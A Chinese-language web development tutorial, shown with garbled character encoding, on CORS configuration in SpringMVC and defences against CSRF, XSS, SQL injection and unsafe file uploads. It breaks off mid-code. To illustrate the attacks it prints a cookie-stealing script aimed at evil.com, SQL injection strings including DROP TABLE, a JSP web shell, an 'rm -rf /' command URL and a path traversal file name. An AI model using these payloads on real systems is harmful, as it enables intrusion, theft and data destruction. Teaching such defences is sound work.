---
title: 10ã€è·¨åŸŸå¤„ç†ä¸Webå®‰å…¨
---
## ğŸ“š ç›®å½•

1. [è·¨åŸŸé—®é¢˜çš„æœ¬è´¨](#1-è·¨åŸŸé—®é¢˜çš„æœ¬è´¨)
2. [CORSè·¨åŸŸèµ„æºå…±äº«](#2-CORSè·¨åŸŸèµ„æºå…±äº«)
3. [SpringMVCè·¨åŸŸè§£å†³æ–¹æ¡ˆ](#3-SpringMVCè·¨åŸŸè§£å†³æ–¹æ¡ˆ)
4. [å¸¸è§Webå®‰å…¨é—®é¢˜](#4-å¸¸è§Webå®‰å…¨é—®é¢˜)
5. [SpringMVCå®‰å…¨é˜²æŠ¤å®è·µ](#5-SpringMVCå®‰å…¨é˜²æŠ¤å®è·µ)
6. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#6-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸŒ è·¨åŸŸé—®é¢˜çš„æœ¬è´¨


### 1.1 ä»€ä¹ˆæ˜¯è·¨åŸŸ


**é€šä¿—ç†è§£**ï¼šæƒ³è±¡ä½ å®¶å°åŒºæœ‰ä¸ªé—¨ç¦ç³»ç»Ÿï¼Œåªå…è®¸æœ¬å°åŒºçš„äººè‡ªç”±å‡ºå…¥ã€‚å¦‚æœå¤–æ¥äººå‘˜æƒ³è¿›æ¥ï¼Œå°±éœ€è¦ç‰¹æ®Šçš„é€šè¡Œè¯ã€‚**è·¨åŸŸå°±æ˜¯æµè§ˆå™¨çš„"é—¨ç¦ç³»ç»Ÿ"**ã€‚

```
å®é™…åœºæ™¯ï¼š
ä½ çš„å‰ç«¯é¡µé¢ï¼šhttp://localhost:8080
ä½ çš„åç«¯æ¥å£ï¼šhttp://localhost:8081

æµè§ˆå™¨å‘ç°ï¼šè¯¶ï¼Ÿç«¯å£å·ä¸ä¸€æ ·ï¼è¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„"å°åŒº"ï¼
ç»“æœï¼šè¯·æ±‚è¢«æµè§ˆå™¨æ‹¦æˆª âŒ
```

**ä¸“ä¸šå®šä¹‰**ï¼šæµè§ˆå™¨çš„**åŒæºç­–ç•¥**ï¼ˆSame-Origin Policyï¼‰è§„å®šï¼Œä¸åŒæºçš„ç½‘é¡µä¸èƒ½ç›¸äº’è®¿é—®æ•°æ®ã€‚

### 1.2 ä»€ä¹ˆç®—"ä¸åŒæº"


ä¸‰ä¸ªè¦ç´ ä¸­**ä»»æ„ä¸€ä¸ªä¸åŒ**ï¼Œå°±ç®—è·¨åŸŸï¼š

| è¦ç´  | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|------|
| **åè®®** | http vs https | `http://a.com` â‰  `https://a.com` |
| **åŸŸå** | åŸŸåä¸åŒ | `http://a.com` â‰  `http://b.com` |
| **ç«¯å£** | ç«¯å£ä¸åŒ | `http://a.com:8080` â‰  `http://a.com:8081` |

**è®°å¿†å£è¯€**ï¼šåè®®ã€åŸŸåã€ç«¯å£ï¼Œä¸‰è€…å…¨åŒæ‰ç®—"äº²"

### 1.3 ä¸ºä»€ä¹ˆä¼šæœ‰è·¨åŸŸé™åˆ¶


**æµè§ˆå™¨çš„å®‰å…¨è€ƒè™‘**ï¼š

```
å‡å¦‚æ²¡æœ‰è·¨åŸŸé™åˆ¶ï¼š
1. ä½ ç™»å½•äº†é“¶è¡Œç½‘ç«™ bank.com
2. æµè§ˆå™¨ä¿å­˜äº†ç™»å½•å‡­è¯ï¼ˆCookieï¼‰
3. ä½ åˆè®¿é—®äº†æ¶æ„ç½‘ç«™ evil.com
4. æ¶æ„ç½‘ç«™å¯ä»¥ç”¨ä½ çš„å‡­è¯è®¿é—® bank.com
5. ä½ çš„é’±å°±æ²¡äº†ï¼ğŸ’¸

æœ‰äº†è·¨åŸŸé™åˆ¶ï¼š
evil.com æ— æ³•è¯»å– bank.com çš„æ•°æ® âœ…
```

> ğŸ’¡ **æ ¸å¿ƒç†è§£**  
> è·¨åŸŸé™åˆ¶æ˜¯**æµè§ˆå™¨çš„å®‰å…¨æœºåˆ¶**ï¼Œä¸æ˜¯æœåŠ¡å™¨çš„é™åˆ¶ã€‚ç”¨Postmanæµ‹è¯•æ¥å£ä¸ä¼šæœ‰è·¨åŸŸé—®é¢˜ï¼Œå› ä¸ºPostmanä¸æ˜¯æµè§ˆå™¨ã€‚

---

## 2. ğŸ”“ CORSè·¨åŸŸèµ„æºå…±äº«


### 2.1 CORSæ˜¯ä»€ä¹ˆ


**CORS**ï¼ˆCross-Origin Resource Sharingï¼‰= **è·¨åŸŸèµ„æºå…±äº«**

**é€šä¿—ç†è§£**ï¼šå°±åƒå°åŒºé—¨ç¦å¯ä»¥ç»™è®¿å®¢åŠç†ä¸´æ—¶é€šè¡Œè¯ï¼ŒCORSå°±æ˜¯æœåŠ¡å™¨ç»™æµè§ˆå™¨å‘çš„"é€šè¡Œè¯"ã€‚

```
å·¥ä½œæµç¨‹ï¼š
æµè§ˆå™¨ï¼šæˆ‘èƒ½è®¿é—®ä½ çš„æ•°æ®å—ï¼Ÿ
æœåŠ¡å™¨ï¼šå¯ä»¥ï¼Œæˆ‘ç»™ä½ å‘ä¸ªé€šè¡Œè¯ï¼ˆå“åº”å¤´ï¼‰
æµè§ˆå™¨ï¼šæ”¶åˆ°ï¼æ”¾è¡Œ âœ…
```

### 2.2 CORSå·¥ä½œåŸç†


**ä¸¤ç§è¯·æ±‚ç±»å‹**ï¼š

#### ğŸ”¹ ç®€å•è¯·æ±‚ï¼ˆSimple Requestï¼‰


æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„è¯·æ±‚ï¼š
- è¯·æ±‚æ–¹æ³•ï¼š`GET`ã€`POST`ã€`HEAD`
- è¯·æ±‚å¤´åªåŒ…å«ï¼š`Accept`ã€`Content-Type`ç­‰åŸºæœ¬å­—æ®µ
- Content-Type åªèƒ½æ˜¯ï¼š`text/plain`ã€`multipart/form-data`ã€`application/x-www-form-urlencoded`

```
ç®€å•è¯·æ±‚æµç¨‹å›¾ï¼š

æµè§ˆå™¨                           æœåŠ¡å™¨
  |                                |
  |----[1] å‘é€è¯·æ±‚---------------->|
  |    Origin: http://a.com        |
  |                                |
  |<---[2] è¿”å›å“åº”-----------------|
  |    Access-Control-Allow-Origin:|
  |    http://a.com                |
  |                                |
  |----[3] æµè§ˆå™¨æ£€æŸ¥å“åº”å¤´-------->|
  |    é€šè¿‡ï¼å±•ç¤ºæ•°æ® âœ…            |
```

**å…³é”®å“åº”å¤´**ï¼š

| å“åº”å¤´ | å«ä¹‰ | ç¤ºä¾‹ |
|--------|------|------|
| `Access-Control-Allow-Origin` | å…è®¸å“ªäº›åŸŸè®¿é—® | `http://localhost:8080` |
| `Access-Control-Allow-Credentials` | æ˜¯å¦å…è®¸æºå¸¦Cookie | `true` |
| `Access-Control-Expose-Headers` | å…è®¸å‰ç«¯è®¿é—®çš„å“åº”å¤´ | `Authorization` |

#### ğŸ”¹ é¢„æ£€è¯·æ±‚ï¼ˆPreflight Requestï¼‰


**ä¸ç¬¦åˆç®€å•è¯·æ±‚**çš„éƒ½æ˜¯é¢„æ£€è¯·æ±‚ï¼Œæ¯”å¦‚ï¼š
- ä½¿ç”¨ `PUT`ã€`DELETE` æ–¹æ³•
- Content-Type æ˜¯ `application/json`
- è‡ªå®šä¹‰è¯·æ±‚å¤´

```
é¢„æ£€è¯·æ±‚æµç¨‹å›¾ï¼š

æµè§ˆå™¨                           æœåŠ¡å™¨
  |                                |
  |----[1] é¢„æ£€è¯·æ±‚(OPTIONS)------->|
  |    æˆ‘æƒ³ç”¨DELETEæ–¹æ³•             |
  |    èƒ½è¡Œå—ï¼Ÿ                     |
  |                                |
  |<---[2] é¢„æ£€å“åº”-----------------|
  |    å¯ä»¥ï¼å…è®¸DELETE             |
  |                                |
  |----[3] å®é™…è¯·æ±‚(DELETE)-------->|
  |    å‘é€çœŸæ­£çš„è¯·æ±‚               |
  |                                |
  |<---[4] è¿”å›æ•°æ®-----------------|
```

**é¢„æ£€è¯·æ±‚çš„å“åº”å¤´**ï¼š

```http
Access-Control-Allow-Origin: http://localhost:8080
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 3600
```

> ğŸ“ **å…³é”®ç‚¹**  
> `Access-Control-Max-Age` è¡¨ç¤ºé¢„æ£€è¯·æ±‚çš„ç»“æœå¯ä»¥ç¼“å­˜å¤šä¹…ï¼ˆç§’ï¼‰ï¼Œé¿å…æ¯æ¬¡éƒ½å‘é¢„æ£€è¯·æ±‚ã€‚

---

## 3. ğŸ› ï¸ SpringMVCè·¨åŸŸè§£å†³æ–¹æ¡ˆ


### 3.1 æ–¹æ¡ˆä¸€ï¼š@CrossOriginæ³¨è§£


**é€‚ç”¨åœºæ™¯**ï¼šå•ä¸ªæ¥å£æˆ–å•ä¸ªControlleréœ€è¦è·¨åŸŸ

#### ğŸ”¸ åŸºç¡€ç”¨æ³•


```java
@RestController
@RequestMapping("/api/user")
public class UserController {
    
    // å…è®¸æ‰€æœ‰åŸŸè®¿é—®è¿™ä¸ªæ¥å£
    @CrossOrigin
    @GetMapping("/info")
    public User getUserInfo() {
        return new User("å¼ ä¸‰", 25);
    }
}
```

#### ğŸ”¸ æŒ‡å®šå…è®¸çš„åŸŸ


```java
// åªå…è®¸ç‰¹å®šåŸŸè®¿é—®
@CrossOrigin(origins = "http://localhost:8080")
@PostMapping("/save")
public String saveUser(@RequestBody User user) {
    return "ä¿å­˜æˆåŠŸ";
}

// å…è®¸å¤šä¸ªåŸŸ
@CrossOrigin(origins = {
    "http://localhost:8080",
    "http://example.com"
})
@GetMapping("/list")
public List<User> getUserList() {
    return userService.findAll();
}
```

#### ğŸ”¸ å®Œæ•´é…ç½®é€‰é¡¹


```java
@CrossOrigin(
    origins = "http://localhost:8080",           // å…è®¸çš„åŸŸ
    methods = {RequestMethod.GET, RequestMethod.POST}, // å…è®¸çš„æ–¹æ³•
    allowedHeaders = "*",                        // å…è®¸çš„è¯·æ±‚å¤´
    exposedHeaders = "Authorization",            // æš´éœ²çš„å“åº”å¤´
    allowCredentials = "true",                   // å…è®¸Cookie
    maxAge = 3600                                // é¢„æ£€è¯·æ±‚ç¼“å­˜æ—¶é—´(ç§’)
)
@GetMapping("/data")
public String getData() {
    return "æ•°æ®";
}
```

#### ğŸ”¸ Controllerçº§åˆ«é…ç½®


```java
// ä½œç”¨äºæ•´ä¸ªController
@CrossOrigin(origins = "http://localhost:8080")
@RestController
@RequestMapping("/api/product")
public class ProductController {
    
    // è¿™é‡Œçš„æ‰€æœ‰æ–¹æ³•éƒ½ä¼šåº”ç”¨è·¨åŸŸé…ç½®
    @GetMapping("/list")
    public List<Product> getProducts() { }
    
    @PostMapping("/add")
    public String addProduct(@RequestBody Product product) { }
}
```

> âš ï¸ **æ³¨æ„äº‹é¡¹**  
> - `origins = "*"` å’Œ `allowCredentials = "true"` **ä¸èƒ½åŒæ—¶ä½¿ç”¨**
> - ç”Ÿäº§ç¯å¢ƒå»ºè®®æŒ‡å®šå…·ä½“çš„åŸŸåï¼Œä¸è¦ç”¨é€šé…ç¬¦ `*`

### 3.2 æ–¹æ¡ˆäºŒï¼šå…¨å±€è·¨åŸŸé…ç½®


**é€‚ç”¨åœºæ™¯**ï¼šæ•´ä¸ªé¡¹ç›®éƒ½éœ€è¦è·¨åŸŸï¼Œç»Ÿä¸€é…ç½®æ›´æ–¹ä¾¿

#### ğŸ”¸ å®ç°WebMvcConfigurer


```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")  // æ‹¦æˆªæ‰€æœ‰è·¯å¾„
                .allowedOrigins("http://localhost:8080", "http://example.com")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowedHeaders("*")
                .exposedHeaders("Authorization")
                .allowCredentials(true)
                .maxAge(3600);
    }
}
```

**é…ç½®è¯´æ˜**ï¼š

| æ–¹æ³• | è¯´æ˜ | ç¤ºä¾‹ |
|------|------|------|
| `addMapping()` | é…ç½®å“ªäº›è·¯å¾„éœ€è¦è·¨åŸŸ | `/**` æ‰€æœ‰è·¯å¾„ |
| `allowedOrigins()` | å…è®¸å“ªäº›åŸŸ | å…·ä½“åŸŸååˆ—è¡¨ |
| `allowedMethods()` | å…è®¸å“ªäº›HTTPæ–¹æ³• | GETã€POSTç­‰ |
| `allowedHeaders()` | å…è®¸å“ªäº›è¯·æ±‚å¤´ | `*` è¡¨ç¤ºæ‰€æœ‰ |
| `allowCredentials()` | æ˜¯å¦å…è®¸Cookie | true/false |

#### ğŸ”¸ åŒºåˆ†ä¸åŒè·¯å¾„çš„é…ç½®


```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        // å¼€æ”¾æ¥å£ï¼šå…è®¸æ‰€æœ‰åŸŸè®¿é—®
        registry.addMapping("/api/public/**")
                .allowedOrigins("*")
                .allowedMethods("GET", "POST");
        
        // ç§æœ‰æ¥å£ï¼šåªå…è®¸ç‰¹å®šåŸŸè®¿é—®
        registry.addMapping("/api/private/**")
                .allowedOrigins("http://localhost:8080")
                .allowedMethods("GET", "POST", "PUT", "DELETE")
                .allowCredentials(true);
    }
}
```

### 3.3 æ–¹æ¡ˆä¸‰ï¼šè¿‡æ»¤å™¨æ–¹å¼


**é€‚ç”¨åœºæ™¯**ï¼šéœ€è¦æ›´çµæ´»çš„æ§åˆ¶é€»è¾‘

```java
@Component
public class CorsFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest req, ServletResponse res, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;
        
        // è·å–è¯·æ±‚æ¥æº
        String origin = request.getHeader("Origin");
        
        // åŠ¨æ€è®¾ç½®å…è®¸çš„åŸŸ
        if (isAllowedOrigin(origin)) {
            response.setHeader("Access-Control-Allow-Origin", origin);
            response.setHeader("Access-Control-Allow-Methods", 
                              "GET, POST, PUT, DELETE");
            response.setHeader("Access-Control-Allow-Headers", 
                              "Content-Type, Authorization");
            response.setHeader("Access-Control-Allow-Credentials", "true");
        }
        
        // å¤„ç†é¢„æ£€è¯·æ±‚
        if ("OPTIONS".equals(request.getMethod())) {
            response.setStatus(HttpServletResponse.SC_OK);
            return;
        }
        
        chain.doFilter(req, res);
    }
    
    // åˆ¤æ–­æ˜¯å¦å…è®¸è¯¥åŸŸ
    private boolean isAllowedOrigin(String origin) {
        List<String> allowedOrigins = Arrays.asList(
            "http://localhost:8080",
            "http://example.com"
        );
        return allowedOrigins.contains(origin);
    }
}
```

### 3.4 ä¸‰ç§æ–¹æ¡ˆå¯¹æ¯”


| æ–¹æ¡ˆ | ä¼˜ç‚¹ | ç¼ºç‚¹ | é€‚ç”¨åœºæ™¯ |
|------|------|------|----------|
| **@CrossOriginæ³¨è§£** | çµæ´»ã€ç²¾ç¡®æ§åˆ¶ | éœ€è¦æ¯ä¸ªæ–¹æ³•é…ç½® | å°‘é‡æ¥å£éœ€è¦è·¨åŸŸ |
| **å…¨å±€é…ç½®** | ç»Ÿä¸€ç®¡ç†ã€ä»£ç ç®€æ´ | çµæ´»æ€§ç¨å·® | æ•´ä¸ªé¡¹ç›®ç»Ÿä¸€è·¨åŸŸç­–ç•¥ |
| **è¿‡æ»¤å™¨** | æœ€çµæ´»ã€å¯è‡ªå®šä¹‰é€»è¾‘ | ä»£ç è¾ƒå¤æ‚ | éœ€è¦å¤æ‚çš„è·¨åŸŸé€»è¾‘ |

> ğŸ’¡ **æ¨èåšæ³•**  
> - å¼€å‘ç¯å¢ƒï¼šä½¿ç”¨å…¨å±€é…ç½®ï¼Œç®€å•å¿«æ·
> - ç”Ÿäº§ç¯å¢ƒï¼šæ ¹æ®å…·ä½“éœ€æ±‚é€‰æ‹©ï¼Œä¼˜å…ˆè€ƒè™‘å®‰å…¨æ€§

---

## 4. ğŸ”’ å¸¸è§Webå®‰å…¨é—®é¢˜


### 4.1 CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ 


#### ğŸ”¸ ä»€ä¹ˆæ˜¯CSRF


**é€šä¿—ç†è§£**ï¼šå°±åƒæœ‰äººå†’å……ä½ çš„èº«ä»½å»é“¶è¡Œå–é’±ã€‚

```
æ”»å‡»æµç¨‹ç¤ºä¾‹ï¼š

1. ä½ ç™»å½•äº†é“¶è¡Œç½‘ç«™ bank.com âœ…
2. æµè§ˆå™¨ä¿å­˜äº†ç™»å½•å‡­è¯ï¼ˆCookieï¼‰
3. ä½ è®¿é—®äº†æ¶æ„ç½‘ç«™ evil.com
4. evil.com é¡µé¢é‡Œè—ç€è¿™æ ·çš„ä»£ç ï¼š
   <img src="http://bank.com/transfer?to=hacker&money=10000">
5. æµè§ˆå™¨è‡ªåŠ¨å¸¦ç€ä½ çš„Cookieè®¿é—®è¿™ä¸ªé“¾æ¥
6. é“¶è¡ŒæœåŠ¡å™¨ä»¥ä¸ºæ˜¯ä½ è‡ªå·±æ“ä½œï¼Œè½¬è´¦æˆåŠŸ ğŸ’¸
```

**ä¸“ä¸šå®šä¹‰**ï¼šæ”»å‡»è€…è¯±å¯¼ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™ï¼Œåˆ©ç”¨ç”¨æˆ·çš„ç™»å½•å‡­è¯ï¼Œä»¥ç”¨æˆ·åä¹‰æ‰§è¡Œéé¢„æœŸæ“ä½œã€‚

#### ğŸ”¸ CSRFæ”»å‡»ç‰¹ç‚¹


- âœ… æ”»å‡»è€…æ— æ³•è·å–Cookieï¼Œåªæ˜¯"å€Ÿç”¨"
- âœ… æ”»å‡»é€šå¸¸å‘ç”Ÿåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™
- âœ… æ”»å‡»è€…æ— æ³•çœ‹åˆ°å“åº”å†…å®¹ï¼Œåªèƒ½å‘èµ·è¯·æ±‚

#### ğŸ”¸ é˜²æŠ¤æ–¹æ¡ˆ


**æ–¹æ¡ˆ1ï¼šCSRF Tokenï¼ˆæœ€å¸¸ç”¨ï¼‰**

```
å·¥ä½œåŸç†ï¼š
1. æœåŠ¡å™¨ç”ŸæˆéšæœºToken
2. Tokenä¿å­˜åœ¨Sessionä¸­
3. è¿”å›é¡µé¢æ—¶ï¼ŒTokenè—åœ¨è¡¨å•é‡Œ
4. æäº¤æ—¶éªŒè¯Tokenæ˜¯å¦åŒ¹é…

ä¸ºä»€ä¹ˆå®‰å…¨ï¼Ÿ
æ¶æ„ç½‘ç«™æ— æ³•è·å–Tokenï¼Œå› ä¸ºè·¨åŸŸé™åˆ¶ï¼
```

**æ–¹æ¡ˆ2ï¼šæ£€æŸ¥Refererå¤´**

```java
@Component
public class CsrfFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest req, ServletResponse res, 
                        FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest request = (HttpServletRequest) req;
        String referer = request.getHeader("Referer");
        
        // æ£€æŸ¥è¯·æ±‚æ¥æº
        if (referer == null || !referer.startsWith("http://yourdomain.com")) {
            throw new SecurityException("éæ³•è¯·æ±‚æ¥æº");
        }
        
        chain.doFilter(req, res);
    }
}
```

**æ–¹æ¡ˆ3ï¼šSameSite Cookie**

```java
// è®¾ç½®Cookieæ—¶æŒ‡å®šSameSiteå±æ€§
Cookie cookie = new Cookie("token", tokenValue);
cookie.setSecure(true);  // åªåœ¨HTTPSä¸‹ä¼ è¾“
cookie.setHttpOnly(true); // ç¦æ­¢JavaScriptè®¿é—®
// cookie.setSameSite("Strict"); // Spring Boot 2.6+æ”¯æŒ
```

### 4.2 XSSè·¨ç«™è„šæœ¬æ”»å‡»


#### ğŸ”¸ ä»€ä¹ˆæ˜¯XSS


**é€šä¿—ç†è§£**ï¼šæ”»å‡»è€…æŠŠæ¶æ„ä»£ç æ³¨å…¥åˆ°ç½‘é¡µé‡Œï¼Œå½“å…¶ä»–ç”¨æˆ·è®¿é—®æ—¶ï¼Œæ¶æ„ä»£ç å°±ä¼šæ‰§è¡Œã€‚

```
æ”»å‡»ç¤ºä¾‹ï¼š

ç”¨æˆ·åœ¨è¯„è®ºæ¡†è¾“å…¥ï¼š
<script>
  // çªƒå–Cookieå‘é€ç»™æ”»å‡»è€…
  document.location='http://evil.com/steal?cookie='+document.cookie;
</script>

å¦‚æœåç«¯æ²¡æœ‰è¿‡æ»¤ï¼Œè¿™æ®µä»£ç ä¼šè¢«ä¿å­˜åˆ°æ•°æ®åº“
å…¶ä»–ç”¨æˆ·æ‰“å¼€é¡µé¢æ—¶ï¼Œè¿™æ®µè„šæœ¬å°±ä¼šæ‰§è¡Œ âŒ
```

#### ğŸ”¸ XSSæ”»å‡»ç±»å‹


**åå°„å‹XSS**ï¼šæ¶æ„ä»£ç åœ¨URLä¸­

```
http://example.com/search?keyword=<script>alert('XSS')</script>

å¦‚æœé¡µé¢ç›´æ¥æ˜¾ç¤ºkeywordå†…å®¹ï¼Œè„šæœ¬å°±ä¼šæ‰§è¡Œ
```

**å­˜å‚¨å‹XSS**ï¼šæ¶æ„ä»£ç ä¿å­˜åœ¨æ•°æ®åº“ä¸­

```
æ”»å‡»è€…å‘è¡¨è¯„è®ºæ—¶æ’å…¥æ¶æ„è„šæœ¬
è„šæœ¬ä¿å­˜åˆ°æ•°æ®åº“
æ‰€æœ‰æŸ¥çœ‹è¯„è®ºçš„ç”¨æˆ·éƒ½ä¼šä¸­æ‹› âš ï¸
```

**DOMå‹XSS**ï¼šé€šè¿‡ä¿®æ”¹DOMæ‰§è¡Œè„šæœ¬

```javascript
// å±é™©çš„å‰ç«¯ä»£ç 
var keyword = location.hash.substring(1);
document.getElementById('result').innerHTML = keyword;

// è®¿é—®ï¼šhttp://example.com/#<img src=x onerror=alert('XSS')>
```

#### ğŸ”¸ é˜²æŠ¤æ–¹æ¡ˆ


**æ–¹æ¡ˆ1ï¼šè¾“å…¥è¿‡æ»¤ï¼ˆä¸æ¨èä½œä¸ºä¸»è¦æ–¹æ¡ˆï¼‰**

```java
public String filterXSS(String input) {
    if (input == null) return null;
    
    // ç§»é™¤å±é™©å­—ç¬¦
    input = input.replaceAll("<", "&lt;")
                 .replaceAll(">", "&gt;")
                 .replaceAll("\"", "&quot;")
                 .replaceAll("'", "&#x27;");
    
    return input;
}
```

**æ–¹æ¡ˆ2ï¼šè¾“å‡ºè½¬ä¹‰ï¼ˆæ¨èï¼‰**

```jsp
<!-- JSPä¸­ä½¿ç”¨JSTLè½¬ä¹‰ -->
<c:out value="${userInput}" escapeXml="true"/>

<!-- Thymeleafè‡ªåŠ¨è½¬ä¹‰ -->
<p th:text="${userInput}"></p>
```

**æ–¹æ¡ˆ3ï¼šè®¾ç½®Content-Security-Policy**

```java
@Override
protected void doFilterInternal(HttpServletRequest request, 
                                HttpServletResponse response, 
                                FilterChain chain) {
    // é™åˆ¶èµ„æºåŠ è½½æ¥æº
    response.setHeader("Content-Security-Policy", 
        "default-src 'self'; script-src 'self' https://trusted.com");
    
    chain.doFilter(request, response);
}
```

### 4.3 SQLæ³¨å…¥æ”»å‡»


#### ğŸ”¸ ä»€ä¹ˆæ˜¯SQLæ³¨å…¥


**é€šä¿—ç†è§£**ï¼šæ”»å‡»è€…é€šè¿‡è¾“å…¥ç‰¹æ®Šå­—ç¬¦ï¼Œæ”¹å˜SQLè¯­å¥çš„æ‰§è¡Œé€»è¾‘ã€‚

```
æ­£å¸¸ç™»å½•ï¼š
SELECT * FROM users WHERE username='admin' AND password='123456'

SQLæ³¨å…¥ï¼š
ç”¨æˆ·åè¾“å…¥ï¼šadmin' OR '1'='1
å¯†ç è¾“å…¥ï¼šéšä¾¿è¾“

å®é™…æ‰§è¡Œçš„SQLï¼š
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='ä»»æ„'

å› ä¸º '1'='1' æ°¸è¿œä¸ºçœŸï¼ŒæŸ¥è¯¢ä¼šè¿”å›æ‰€æœ‰ç”¨æˆ· âŒ
```

#### ğŸ”¸ æ›´å±é™©çš„æ³¨å…¥


```sql
-- åˆ åº“è·‘è·¯ç‰ˆ
ç”¨æˆ·è¾“å…¥ï¼šadmin'; DROP TABLE users; --

å®é™…æ‰§è¡Œï¼š
SELECT * FROM users WHERE username='admin'; 
DROP TABLE users; 
--' AND password='xxx'

-- ä¸¤ä¸ªåˆ†å·åˆ†éš”äº†ä¸‰æ¡SQLè¯­å¥ï¼
```

#### ğŸ”¸ é˜²æŠ¤æ–¹æ¡ˆ


**æ–¹æ¡ˆ1ï¼šä½¿ç”¨PreparedStatementï¼ˆå¼ºçƒˆæ¨èï¼‰**

```java
// âŒ å±é™©çš„æ‹¼æ¥SQL
public User login(String username, String password) {
    String sql = "SELECT * FROM users WHERE username='" + username + 
                 "' AND password='" + password + "'";
    return jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper<>(User.class));
}

// âœ… å®‰å…¨çš„å‚æ•°åŒ–æŸ¥è¯¢
public User login(String username, String password) {
    String sql = "SELECT * FROM users WHERE username=? AND password=?";
    return jdbcTemplate.queryForObject(sql, 
        new BeanPropertyRowMapper<>(User.class), username, password);
}
```

**æ–¹æ¡ˆ2ï¼šä½¿ç”¨ORMæ¡†æ¶**

```java
// MyBatisä¼šè‡ªåŠ¨å¤„ç†å‚æ•°è½¬ä¹‰
@Select("SELECT * FROM users WHERE username=#{username} AND password=#{password}")
User login(@Param("username") String username, @Param("password") String password);
```

**æ–¹æ¡ˆ3ï¼šè¾“å…¥éªŒè¯**

```java
public boolean isValidUsername(String username) {
    // åªå…è®¸å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿
    return username.matches("^[a-zA-Z0-9_]{3,20}$");
}
```

### 4.4 æ–‡ä»¶ä¸Šä¼ å®‰å…¨


#### ğŸ”¸ å¸¸è§æ”»å‡»æ–¹å¼


**1. ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶**
```
æ”»å‡»è€…ä¸Šä¼  shell.jspï¼š
<%
    Runtime.getRuntime().exec(request.getParameter("cmd"));
%>

ç„¶åè®¿é—®ï¼šhttp://yoursite.com/upload/shell.jsp?cmd=rm -rf /
```

**2. æ–‡ä»¶åæ³¨å…¥**
```
ä¸Šä¼ æ–‡ä»¶åï¼š../../etc/passwd
å¦‚æœæ²¡æœ‰è¿‡æ»¤ï¼Œå¯èƒ½è¦†ç›–ç³»ç»Ÿæ–‡ä»¶ âš ï¸
```

#### ğŸ”¸ é˜²æŠ¤æ–¹æ¡ˆ


```java
@PostMapping("/upload")
public String uploadFile(@RequestParam("file") MultipartFile file) {
    
    // 1. æ£€æŸ¥æ–‡ä»¶å¤§å°
    if (file.getSize() > 10 * 1024 * 1024) { // 10MB
        throw new RuntimeException("æ–‡ä»¶è¿‡å¤§");
    }
    
    // 2. æ£€æŸ¥æ–‡ä»¶ç±»å‹ï¼ˆç™½åå•ï¼‰
    String contentType = file.getContentType();
    List<String> allowedTypes = Arrays.asList(
        "image/jpeg", "image/png", "image/gif"
    );
    if (!allowedTypes.contains(contentType)) {
        throw new RuntimeException("ä¸å…è®¸çš„æ–‡ä»¶ç±»å‹");
    }
    
    // 3. æ£€æŸ¥æ–‡ä»¶æ‰©å±•å
    String originalFilename = file.getOriginalFilename();
    String extension = originalFilename.substring(
        originalFilename.lastIndexOf(".")
    ).toLowerCase();
    
    if (!Arrays.asList(".jpg", ".png", ".gif").contains(extension)) {
        throw new RuntimeException("ä¸å…è®¸çš„æ–‡ä»¶æ‰©å±•å");
    }
    
    // 4. é‡å‘½åæ–‡ä»¶ï¼ˆé¿å…æ–‡ä»¶åæ³¨å…¥ï¼‰
    String newFilename = UUID.randomUUID().toString() + extension;
    
    // 5. ä¿å­˜åˆ°å®‰å…¨ç›®å½•ï¼ˆä¸åœ¨Webæ ¹ç›®å½•ä¸‹ï¼‰
    String uploadPath = "/data/uploads/" + newFilename;
    file.transferTo(new File(uploadPath));
    
    return "ä¸Šä¼ æˆåŠŸ";
}
```

> âš ï¸ **é‡è¦æç¤º**  
> - æ°¸è¿œä¸è¦ç›¸ä¿¡ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åå’Œç±»å‹
> - ä¸Šä¼ ç›®å½•ç¦æ­¢è„šæœ¬æ‰§è¡Œæƒé™
> - ä½¿ç”¨ç‹¬ç«‹çš„æ–‡ä»¶æœåŠ¡å™¨å­˜å‚¨ä¸Šä¼ æ–‡ä»¶

---

## 5. ğŸ›¡ï¸ SpringMVCå®‰å…¨é˜²æŠ¤å®è·µ


### 5.1 è¯·æ±‚é¢‘ç‡é™åˆ¶ï¼ˆé˜²æ­¢æš´åŠ›ç ´è§£ï¼‰


#### ğŸ”¸ ä½¿ç”¨æ‹¦æˆªå™¨å®ç°


```java
@Component
public class RateLimitInterceptor implements HandlerInterceptor {
    
    // ä½¿ç”¨Guavaçš„RateLimiter
    private final Map<String, RateLimiter> limiters = new ConcurrentHashMap<>();
    
    @Override
    public boolean preHandle(HttpServletRequest request, 
                            HttpServletResponse response, 
                            Object handler) {
        
        String ip = request.getRemoteAddr();
        
        // æ¯ä¸ªIPæ¯ç§’æœ€å¤š10ä¸ªè¯·æ±‚
        RateLimiter limiter = limiters.computeIfAbsent(
            ip, k -> RateLimiter.create(10.0)
        );
        
        if (!limiter.tryAcquire()) {
            response.setStatus(429); // Too Many Requests
            return false;
        }
        
        return true;
    }
}
```

#### ğŸ”¸ ä½¿ç”¨æ³¨è§£æ–¹å¼


```java
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
public @interface RateLimit {
